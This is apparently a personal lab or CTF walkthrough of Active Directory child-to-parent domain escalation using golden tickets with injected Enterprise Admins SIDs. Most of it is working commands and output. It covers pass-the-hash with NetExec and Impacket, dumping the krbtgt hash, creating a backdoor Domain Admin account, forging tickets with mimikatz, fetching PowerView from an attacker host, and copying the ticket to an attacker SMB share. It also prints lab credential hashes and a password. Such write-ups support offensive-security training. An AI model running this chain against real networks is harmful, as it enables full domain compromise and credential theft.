
We need to have Domain Admin on the Source Domain for this to work and Domain Trust needs to be bidirectional!

---

Checking if Domain Trust is bidirectional

```
Get-ADTrust -Filter *
```

Abused Domain Trust Abuse.

```
nxc ldap 192.168.210.16 -u Administrator -H 543beb20a2a579c7714ced68a1760d5e -M raisechild -o ETYPE=aes256
LDAP        192.168.210.16  389    ZPH-SVRCDC01     [*] Windows Server 2022 Build 20348 (name:ZPH-SVRCDC01) (domain:internal.zsm.local) (signing:None) (channel binding:Always) 
LDAP        192.168.210.16  389    ZPH-SVRCDC01     [+] internal.zsm.local\Administrator:543beb20a2a579c7714ced68a1760d5e (Pwn3d!)                                                                                                                        
RAISECHILD  192.168.210.16  389    ZPH-SVRCDC01     [*] Running raisechild module...
RAISECHILD  192.168.210.16  389    ZPH-SVRCDC01     Child Domain SID: S-1-5-21-3056178012-3972705859-491075245
RAISECHILD  192.168.210.16  389    ZPH-SVRCDC01     Parent domain name: zsm.local
RAISECHILD  192.168.210.16  389    ZPH-SVRCDC01     Parent domain SID:  S-1-5-21-2734290894-461713716-141835440
RAISECHILD  192.168.210.16  389    ZPH-SVRCDC01     krbtgt AES256 key: 3bdcbeb0910e5887e6d6c7fbec6c3f29e1e099322ac91cc386ca296a5c5497b0                                                                                                                   
RAISECHILD  192.168.210.16  389    ZPH-SVRCDC01     [+] Golden ticket forged successfully (etype: aes256). Saved to: Administrator.ccache
RAISECHILD  192.168.210.16  389    ZPH-SVRCDC01     [+] Run the following command to use the TGT: export KRB5CCNAME=Administrator.ccache

```

```
export KRB5CCNAME=Administrator.ccache
```

```
nxc smb 192.168.210.10 --use-kcache                                                                               
SMB         192.168.210.10  445    ZPH-SVRDC01      [*] Windows Server 2022 Build 20348 x64 (name:ZPH-SVRDC01) (domain:zsm.local) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         192.168.210.10  445    ZPH-SVRDC01      [+] INTERNAL.ZSM.LOCAL\Administrator from ccache (Pwn3d!)
```

Gained Domain Admin Credentials for Parent Domain which means I've comprimised everything!

```
Administrator:aad3b435b51404eeaad3b435b51404ee:84210eddc5724a7801fe78289ee94d44
```

Let's comprimise all target's now! ;) Nevermind! Didn't work!

```
impacket-psexec Administrator@ZPH-SVRDC01.zsm.local -hashes aad3b435b51404eeaad3b435b51404ee:84210eddc5724a7801fe78289ee94d44
```

Didn't work either!

```
impacket-wmiexec zsm.local/Administrator@ZPH-SVRDC01.zsm.local -hashes aad3b435b51404eeaad3b435b51404ee:84210eddc5724a7801fe78289ee94d44
```

I got an nudge from someone and I had to connect to zabbix and create another pivot.

It was important that I remove my double pivot completly and route the second pivot from zabbix server, not from the DC at 192.168.110.55

After breaking the pivot from 192.168.110.55 I created an pivot from zabbix and added the following route.

```
ip route add 192.168.210.0/24 dev ligolo-triple
```

After that WinRM was accessible for me on many targets.

```
evil-winrm -i 192.168.210.10 -u Administrator -H 84210eddc5724a7801fe78289ee94d44
```

Successfully connected to the target.

---

## 2. Method

1. Let's first create an Domain Admin User

Created user

```
net user /add saitama password123! /domain
```

Added to Domain Admins Group

```
net group "Domain Admins" saitama /add /domain
```

Reassure if change is successfull:

```
net group "Domain Admins"
```

2. Checking if Domain Trust is bidirectional

```
Get-ADTrust -Filter *
```

2. We now need the NTLM Hash of internal/krbtgt

```
impacket-secretsdump internal.zsm.local/Administrator@192.168.210.16 -hashes aad3b435b51404eeaad3b435b51404ee:543beb20a2a579c7714ced68a1760d5e -just-dc-user internal/krbtgt          
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:0540fe51ddd618f42a66ef059ac36441:::
[*] Kerberos keys grabbed
krbtgt:aes256-cts-hmac-sha1-96:3bdcbeb0910e5887e6d6c7fbec6c3f29e1e099322ac91cc386ca296a5c5497b0
krbtgt:aes128-cts-hmac-sha1-96:b6252a6e5ec060751a03c1a73ef2af4e
krbtgt:des-cbc-md5:92755ef7ce8a6e16
[*] Cleaning up...
```

4. We need to transfer PowerView.ps1 for this.

```
iwr -uri http://10.10.14.63:445/PowerView.ps1 -OutFile PowerView.ps1
```

5. Import Module

```
Import-Module .\PowerView.ps1
```

 6. Get SID of Child Domain (internal.zsm.local)

```
Get-DomainSID
S-1-5-21-3056178012-3972705859-491075245
```

7. Create Credential Object out of an comprimised Domain User of the "Target" Domain 

```
$secpass = ConvertTo-SecureString '!QAZ2wsx' -AsPlainText -Force
```

```
$marcus = New-Object System.Management.Automation.PSCredential('zsm.local\marcus', $secpass)
```

```
$marcus.UserName
```

8. Find the SID of Enterprise Admins Group at PARENT Domain

```
PS C:\Temp> Get-DomainGroup "Enterprise *" -Cred $marcus 
Get-DomainGroup "Enterprise *" -Cred $marcus 


grouptype              : UNIVERSAL_SCOPE, SECURITY
admincount             : 1
name                   : Enterprise Admins
samaccounttype         : GROUP_OBJECT
samaccountname         : Enterprise Admins
whenchanged            : 15/03/2022 15:35:44
objectsid              : S-1-5-21-2734290894-461713716-141835440-519
objectclass            : {top, group}
cn                     : Enterprise Admins
instancetype           : 4
usnchanged             : 12754
dscorepropagationdata  : {15/03/2022 15:35:44, 15/03/2022 15:20:34, 01/01/1601 00:04:16}
iscriticalsystemobject : True
description            : Designated administrators of the enterprise
memberof               : {CN=Denied RODC Password Replication Group,CN=Users,DC=zsm,DC=local, 
                         CN=Administrators,CN=Builtin,DC=zsm,DC=local}
member                 : CN=Administrator,CN=Users,DC=zsm,DC=local
usncreated             : 12339
whencreated            : 15/03/2022 15:20:34
distinguishedname      : CN=Enterprise Admins,CN=Users,DC=zsm,DC=local
objectguid             : 028b118a-e895-48bf-a061-7501413b9874
objectcategory         : CN=Group,CN=Schema,CN=Configuration,DC=zsm,DC=local

usncreated             : 12453
admincount             : 1
name                   : Enterprise Key Admins
samaccounttype         : GROUP_OBJECT
samaccountname         : Enterprise Key Admins
whenchanged            : 15/03/2022 15:35:44
objectsid              : S-1-5-21-2734290894-461713716-141835440-527
objectclass            : {top, group}
grouptype              : UNIVERSAL_SCOPE, SECURITY
cn                     : Enterprise Key Admins
usnchanged             : 12753
dscorepropagationdata  : {15/03/2022 15:35:44, 15/03/2022 15:20:34, 01/01/1601 00:04:16}
iscriticalsystemobject : True
description            : Members of this group can perform administrative actions on key objects within the forest.
distinguishedname      : CN=Enterprise Key Admins,CN=Users,DC=zsm,DC=local
whencreated            : 15/03/2022 15:20:34
instancetype           : 4
objectguid             : 89c39d61-179c-4842-9880-e8c852714e14
objectcategory         : CN=Group,CN=Schema,CN=Configuration,DC=zsm,DC=local

usncreated             : 12429
name                   : Enterprise Read-only Domain Controllers
samaccounttype         : GROUP_OBJECT
samaccountname         : Enterprise Read-only Domain Controllers
whenchanged            : 15/03/2022 15:20:34
objectsid              : S-1-5-21-2734290894-461713716-141835440-498
objectclass            : {top, group}
grouptype              : UNIVERSAL_SCOPE, SECURITY
cn                     : Enterprise Read-only Domain Controllers
usnchanged             : 12431
dscorepropagationdata  : {15/03/2022 15:20:34, 01/01/1601 00:00:01}
iscriticalsystemobject : True
description            : Members of this group are Read-Only Domain Controllers in the enterprise
distinguishedname      : CN=Enterprise Read-only Domain Controllers,CN=Users,DC=zsm,DC=local
whencreated            : 15/03/2022 15:20:34
instancetype           : 4
objectguid             : 66fa3db0-5435-4520-a2c0-054300cd74b5
objectcategory         : CN=Group,CN=Schema,CN=Configuration,DC=zsm,DC=local
```

9. Now use either, ticketer.py, Rubeus.exe or mimikatz.exe to forge a golden ticket so next we can ask for TGT and impersonate on the PARENT domain with something similar:

I'll use mimikatz.exe for this.

Syntax to get an golden ticket is:

```
.\mimikatz.exe "kerberos::golden /user:Administrator /domain:baby.endark.local /sid:<Child Domain SID> /krbtgt:<krbtgt hash> /sids:<EnterpriseAdmin SID>" "exit"
```

But first start it.

```
mimikatz.exe
privilege::debug
```

10. Generate Golden Ticket

The Parent Domain will trust us because the child domain will have the SID of the "Enterprise Domain Admins" Group in there SID History, because it's injected here.

```
mimikatz # kerberos::golden /user:Administrator /domain:internal.zsm.local /sid:S-1-5-21-3056178012-3972705859-491075245 /krbtgt:0540fe51ddd618f42a66ef059ac36441 /sids:S-1-5-21-2734290894-461713716-141835440-519
User      : Administrator
Domain    : internal.zsm.local (INTERNAL)
SID       : S-1-5-21-3056178012-3972705859-491075245
User Id   : 500
Groups Id : *513 512 520 518 519 
Extra SIDs: S-1-5-21-2734290894-461713716-141835440-51 ; 
ServiceKey: 0540fe51ddd618f42a66ef059ac36441 - rc4_hmac_nt      
Lifetime  : 03/08/2026 01:24:23 ; 31/07/2036 01:24:23 ; 31/07/2036 01:24:23
-> Ticket : ticket.kirbi

 * PAC generated
 * PAC signed
 * EncTicketPart generated
 * EncTicketPart encrypted
 * KrbCred generated

Final Ticket Saved to file !
```

11. Check Kerberos Tickets

```
mimikatz # kerberos::list

[00000000] - 0x00000012 - aes256_hmac
   Start/End/MaxRenew: 19/09/2023 08:51:29 ; 19/09/2023 18:51:29 ; 26/09/2023 08:51:29
   Server Name       : krbtgt/INTERNAL.ZSM.LOCAL @ INTERNAL.ZSM.LOCAL
   Client Name       : yovecio @ INTERNAL.ZSM.LOCAL
   Flags 40e10000    : name_canonicalize ; pre_authent ; initial ; renewable ; forwardable ;
```

12. Inject the Golden Ticket into Session.

```
mimikatz # kerberos::ptt ticket.kirbi

* File: 'ticket.kirbi': OK
```

13. Reassure if it worked:

```
mimikatz # kerberos::list

[00000000] - 0x00000017 - rc4_hmac_nt
   Start/End/MaxRenew: 19/09/2023 09:28:43 ; 16/09/2033 09:28:43 ; 16/09/2033 09:28:43
   Server Name       : krbtgt/internal.zsm.local @ internal.zsm.local
   Client Name       : Administrator @ internal.zsm.local
   Flags 40e00000    : pre_authent ; initial ; renewable ; forwardable ;
```

14. Download ticket.kirbi

On local machine:

```
impacket-smbserver test . -smb2support -username saitama -password saitama
```

On target machine:

```
net use m: \\10.10.14.63\test /user:saitama saitama
```

Downloaded golden ticket onto my local machine.

```
copy ticket.kirbi m:\
```

15. Converted Golden Ticket to .ccache format.

```
impacket-ticketConverter ticket.kirbi ticket.ccache
```

16. Now we can use the variable KRB5CCNAME to either map the ticket to the variable or always use the variable with the ticket e.G

```
export KRB5CCNAME=ticket.ccache
```

17. Authenticate against the DC

WARNING: Your DNS Entries need to be correct or it won't work.

```
impacket-wmiexec internal.zsm.local/Administrator@ZPH-SVRDC01.zsm.local -k -no-pass
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[-] [Errno Connection error (ZPH-SVRDC01.zsm.local:445)] [Errno -2] Name or service not known
```